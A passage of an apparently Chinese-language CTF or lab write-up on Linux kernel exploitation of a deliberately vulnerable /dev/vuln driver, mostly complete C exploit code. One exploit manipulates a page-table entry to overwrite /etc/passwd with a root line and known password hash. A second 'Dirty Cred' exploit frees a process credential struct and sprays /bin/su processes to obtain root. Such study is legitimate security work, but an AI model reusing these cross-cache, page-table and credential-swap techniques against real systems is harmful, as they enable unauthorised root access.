class="type">size_t</span> size, <span class="type">char</span>* data)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;</span><br><span class="line">        .id = id,</span><br><span class="line">        .size = size,</span><br><span class="line">        .data = data</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ioctl(fd, CMD_READ, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_free</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;</span><br><span class="line">        .id = id</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CMD_FREE, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x200000UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMAPING_BASE 0x777000000000UL</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/vuln&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Open /dev/vuln failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> obj_per_slab = <span class="number">8</span>;</span><br><span class="line">    <span class="type">int</span> cpu_partial = <span class="number">52</span>;</span><br><span class="line">    <span class="type">int</span> spray_obj_num = obj_per_slab * (cpu_partial + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;allocate obj_per_slab * (cpu_partial + 1) slabs&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; spray_obj_num; i++)&#123;</span><br><span class="line">        obj_alloc(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;create one new active slab&quot;</span>);</span><br><span class="line">    obj_alloc(spray_obj_num);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Freeing objects to release order-0 pages back to the buddy allocator&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; spray_obj_num; i += obj_per_slab) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % (obj_per_slab * <span class="number">2</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; i + obj_per_slab; j++) &#123;</span><br><span class="line">                obj_free(j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            obj_free(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    etcpasswd_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (etcpasswd_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Open /etc/passwd failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Spraying mmaping&quot;</span>);</span><br><span class="line">    <span class="type">int</span> mapping_spraying_num = <span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span> ; i &lt; mapping_spraying_num; i++) &#123;</span><br><span class="line">        <span class="type">void</span> *<span class="built_in">map</span> = mmap((<span class="type">void</span>*)MMAPING_BASE + PAGE_SIZE * i, <span class="number">0x1000</span>, PROT_READ, MAP_PRIVATE, etcpasswd_fd, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">map</span> == MAP_FAILED) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Error mapping&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">volatile</span> <span class="type">char</span> first_byte = ((<span class="type">char</span>*)<span class="built_in">map</span>)[<span class="number">0</span>];</span><br><span class="line">        (<span class="type">void</span>)first_byte; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> victim = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> pte = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; mapping_spraying_num; i+= obj_per_slab*<span class="number">2</span>) &#123;</span><br><span class="line">        obj_read(i, <span class="number">8</span>, (<span class="type">char</span>*)&amp;pte);</span><br><span class="line">        <span class="keyword">if</span> (pte != <span class="number">0</span>) &#123;</span><br><span class="line">            victim = i;</span><br><span class="line">            pte |= <span class="number">0x2</span>;</span><br><span class="line">            obj_write(victim, <span class="number">8</span>, (<span class="type">char</span>*)&amp;pte);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Failed to find evil PTE&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing malicious passwd content&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;root:$1$naup$tZAttOyVXnz7BlRCnYsuv/:0:0:root:/root:/bin/sh&#x27; &gt; /tmp/evil&quot;</span>);</span><br><span class="line">    <span class="type">int</span> evil_fd = open(<span class="string">&quot;/tmp/evil&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (evil_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open /tmp/evil&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (fstat(evil_fd, &amp;st) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fstat /tmp/evil&quot;</span>);</span><br><span class="line">        close(evil_fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Overwriting /etc/passwd via writable mmap&quot;</span>);</span><br><span class="line">    <span class="type">int</span> success = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; mapping_spraying_num; i++) &#123;</span><br><span class="line">        <span class="type">void</span> *addr = (<span class="type">void</span> *)(MMAPING_BASE + PAGE_SIZE * i);</span><br><span class="line">        <span class="type">ssize_t</span> wrote = pread(evil_fd, addr, st.st_size, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (wrote == st.st_size) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Overwrite success at %#lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)addr);</span><br><span class="line">            success = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    close(evil_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Failed to overwrite /etc/passwd&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exploit done! You can now login as root with password &#x27;naup96321&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">~ $ su</span></span><br><span class="line"><span class="comment">Password: </span></span><br><span class="line"><span class="comment">/ # id</span></span><br><span class="line"><span class="comment">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="Dirty-Cred"><a href="#Dirty-Cred" class="headerlink" title="Dirty Cred"></a>Dirty Cred</h2><h3 id="analyze-2"><a href="#analyze-2" class="headerlink" title="analyze"></a>analyze</h3><p>driver 功能變這樣</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_ALLOC   0xf000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_READ    0xf001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_FREE    0xf002</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">obj_alloc</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (objs[id] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    objs[id] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (objs[id] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">obj_read</span><span class="params">(<span class="type">int</span> id, <span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (objs[id] == <span class="literal">NULL</span> || size &gt; OBJ_SIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(data, objs[id]-&gt;buf, size) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">obj_free</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    kfree(objs[id]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>沒有 write 功能了<br>保護一樣是全開的狀態  </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -cpu qemu64,+smap,+smep \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -drive file=rootfs.ext3,format=raw \</span><br><span class="line">    -drive file=flag.txt,format=raw \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -smp 1 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/sda rw init=/init console=ttyS0 kaslr pti=on loglevel=3 oops=panic panic=-1&quot;</span> </span><br></pre></td></tr></table></figure>

<h3 id="attack-2"><a href="#attack-2" class="headerlink" title="attack"></a>attack</h3><p>slab 一些東西不太一樣<br>稍微修改一下  </p>
<p>在沒有辦法寫的狀況下，或許可以考慮做 dirty cred  </p>
<p>現在有一個想法<br>如果我們可以 UAF cred 這個 struct<br>然後 spray，讓我們有一個自己低權限的 proecess UAF 後<br>去 free UAF 低權限的 process  </p>
<p>之後再去 spary 高權限 process<br>來讓 cred 被拿走後被寫入高權限的資訊來提權我們可控的低權限 process  </p>
<p>不過去 spray process 的 noise 非常多<br>但有方法可以降低這個 noise<br>可以參考這篇，通過設定一些 flags 可以大量去降低 noise<br><code>clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND)</code><br><a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html">https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html</a></p>
<h3 id="exploit-2"><a href="#exploit-2" class="headerlink" title="exploit"></a>exploit</h3><p>exploit 穩定度好低，但是可以成功讀出 flag<br>可以在看怎麼提升穩定度  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc exploit.c -o exploit --static -masm=intel</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_ALLOC   0xf000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_READ    0xf001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_FREE    0xf002</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">&#125; <span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_alloc</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;.id = id&#125;;</span><br><span class="line">    assert(ioctl(fd, CMD_ALLOC, &amp;req) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_read</span><span class="params">(<span class="type">int</span> id, <span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;.id = id, .size = size, .data = data&#125;;</span><br><span class="line">    assert(ioctl(fd, CMD_READ, &amp;req) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_free</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;.id = id&#125;;</span><br><span class="line">    assert(ioctl(fd, CMD_FREE, &amp;req) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_CRED_SPRAY      0x50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_ROOT_CRED_SPRAY 0x50</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> usage;</span><br><span class="line">    <span class="type">int</span> uid;</span><br><span class="line">    <span class="type">int</span> gid;</span><br><span class="line">    <span class="type">int</span> suid;</span><br><span class="line">    <span class="type">int</span> sgid;</span><br><span class="line">    <span class="type">int</span> euid;</span><br><span class="line">    <span class="type">int</span> egid;</span><br><span class="line">    <span class="type">int</span> fsuid;</span><br><span class="line">    <span class="type">int</span> fsgid;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">atomic_bool</span> try = <span class="literal">false</span>;</span><br><span class="line"><span class="type">atomic_bool</span> win = <span class="literal">false</span>;</span><br><span class="line"><span class="type">atomic_int</span> failed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">child_func</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="type">atomic_load</span>(&amp;try) != <span class="literal">true</span>) &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (geteuid() == <span class="number">0</span>) &#123;</span><br><span class="line">        fd = open(<span class="string">&quot;/dev/sdb&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (read(fd, flag, <span class="number">0x10</span>) == <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Flag: %s\n&quot;</span>, flag);</span><br><span class="line">    </span><br><span class="line">        <span class="type">atomic_store</span>(&amp;win, <span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        atomic_fetch_add(&amp;failed, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/vuln&quot;</span>, O_RDONLY);</span><br><span class="line">    assert(fd != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get slab information</span></span><br><span class="line">    <span class="type">int</span> objs_per_slab = <span class="number">21</span>;</span><br><span class="line">    <span class="type">int</span> cpu_partial = <span class="number">120</span>;</span><br><span class="line">    <span class="type">int</span> num_spray = objs_per_slab * (cpu_partial + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Allocating %d objects to fill partial list\n&quot;</span>, num_spray);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_spray; i++) &#123;</span><br><span class="line">        obj_alloc(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Creating one new active slab&quot;</span>);</span><br><span class="line">    obj_alloc(num_spray);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Freeing objects to release order-0 pages back to buddy allocator&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_spray; i += objs_per_slab) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % (objs_per_slab * <span class="number">2</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; i + objs_per_slab; j++) &#123;</span><br><span class="line">                obj_free(j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            obj_free(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> <span class="built_in">stack</span>[NUM_CRED_SPRAY][<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_CRED_SPRAY; i++) &#123;</span><br><span class="line">        <span class="type">void</span> *stack_top = <span class="built_in">stack</span>[i] + <span class="number">0x1000</span> - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> flags = CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND | SIGCHLD;</span><br><span class="line">        assert(clone(child_func, stack_top, flags, <span class="literal">NULL</span>) != <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Searching for victim objects&quot;</span>);</span><br><span class="line">    <span class="type">int</span> victim = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">cred</span> =</span> &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_spray; i += objs_per_slab * <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; i + objs_per_slab; j++) &#123;</span><br><span class="line">            obj_read(j, (<span class="type">char</span> *)&amp;cred, <span class="keyword">sizeof</span>(cred));</span><br><span class="line">            <span class="keyword">if</span> (cred.uid == getuid() &amp;&amp; cred.euid == geteuid()) &#123;</span><br><span class="line">                victim = j;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] Found victim object at id %d\n&quot;</span>, victim);</span><br><span class="line">                obj_free(victim);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to find victim object&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying root credentials&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_ROOT_CRED_SPRAY; i++) &#123;</span><br><span class="line">        <span class="type">pid_t</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span> *argv[] = &#123;<span class="string">&quot;/bin/su&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">            execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Triggering privilege escalation&quot;</span>);</span><br><span class="line">    <span class="type">atomic_store</span>(&amp;try, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="type">atomic_load</span>(&amp;win) == <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="type">atomic_load</span>(&amp;failed) == NUM_CRED_SPRAY) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Exploit failed&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


